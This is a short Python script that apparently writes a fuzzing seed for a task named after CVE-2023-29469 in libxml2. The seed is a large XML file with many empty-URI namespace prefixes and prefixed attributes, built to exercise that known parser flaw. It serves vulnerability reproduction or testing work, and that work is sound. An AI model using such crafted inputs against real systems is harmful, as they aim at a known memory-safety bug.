def generate_massive_seed(num_elements=1000, num_attrs_per_elem=20):
    xml = '<?xml version="1.0"?>\n'
    ns_count = 20
    ns_decl = ' '.join([f'xmlns:p{i}=""' for i in range(ns_count)])
    xml += f'<root {ns_decl}>\n'
    
    for elem_idx in range(num_elements):
        prefix = f"p{elem_idx % ns_count}"
        attrs = []
        for attr_idx in range(num_attrs_per_elem):
            attr_prefix = f"p{(attr_idx + elem_idx) % ns_count}"
            attrs.append(f'{attr_prefix}:a{attr_idx}=""')
        attrs_str = ' '.join(attrs)
        xml += f'  <{prefix}:elem{elem_idx} {attrs_str}/>\n'
    
    xml += '</root>\n'
    return xml

seed = generate_massive_seed(num_elements=1000, num_attrs_per_elem=20)
with open("tasks/CVE-2023-29469_libxml2/seeds/seed_ultra_massive.xml", 'w') as f:
    f.write(seed)
print(f"Generated {len(seed)} bytes")
